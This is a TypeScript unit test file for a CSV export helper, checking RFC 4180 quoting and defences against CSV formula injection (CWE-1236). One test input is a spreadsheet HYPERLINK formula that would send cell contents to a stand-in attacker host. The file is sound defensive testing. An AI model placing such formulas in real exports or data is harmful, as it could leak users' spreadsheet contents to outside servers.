import { toCsv, type CsvColumn } from './csv.util';

interface Row {
  title: string;
}

const COLUMNS: CsvColumn<Row>[] = [{ header: 'Title', value: (r) => r.title }];

/** Everything after the BOM and the header line, without the trailing CRLF. */
function dataLines(csv: string): string[] {
  return csv
    .replace(/^\uFEFF/, '')
    .trimEnd()
    .split('\r\n')
    .slice(1);
}

describe('toCsv', () => {
  it('leaves an ordinary value untouched', () => {
    expect(dataLines(toCsv([{ title: 'Fuga en el baño' }], COLUMNS))).toEqual([
      'Fuga en el baño',
    ]);
  });

  it('quotes and doubles quotes only where RFC 4180 needs it', () => {
    expect(
      dataLines(toCsv([{ title: 'Grieta, 2m "grande"' }], COLUMNS)),
    ).toEqual(['"Grieta, 2m ""grande"""']);
  });

  // F9.4 — CSV injection (CWE-1236). The threat is not the API's own parser,
  // it is Excel/Sheets on whatever machine opens the export, so the assertion
  // is that the cell can no longer *start* a formula there.
  it.each([
    ['=HYPERLINK("https://attacker.test/?d="&A1,"Ver")', '='],
    ['+1-1', '+'],
    ['-1+1', '-'],
    ['@SUM(A1:A9)', '@'],
    ['   =1+1', 'leading whitespace then ='],
    ['\t=1+1', 'leading tab'],
  ])('neutralizes a formula-shaped title (%s — %s)', (title) => {
    const [line] = dataLines(toCsv([{ title }], COLUMNS));
    // The apostrophe comes first; a spreadsheet reads it as "this is text"
    // and shows the original value.
    expect(line.replace(/^"|"$/g, '').replace(/""/g, '"')).toBe(`'${title}`);
  });

  it('still quotes a neutralized value that also needs quoting', () => {
    const [line] = dataLines(toCsv([{ title: '=A1,B2' }], COLUMNS));
    expect(line).toBe(`"'=A1,B2"`);
  });

  it('does not touch a value that merely contains an equals sign', () => {
    expect(dataLines(toCsv([{ title: 'ancho = 2m' }], COLUMNS))).toEqual([
      'ancho = 2m',
    ]);
  });
});
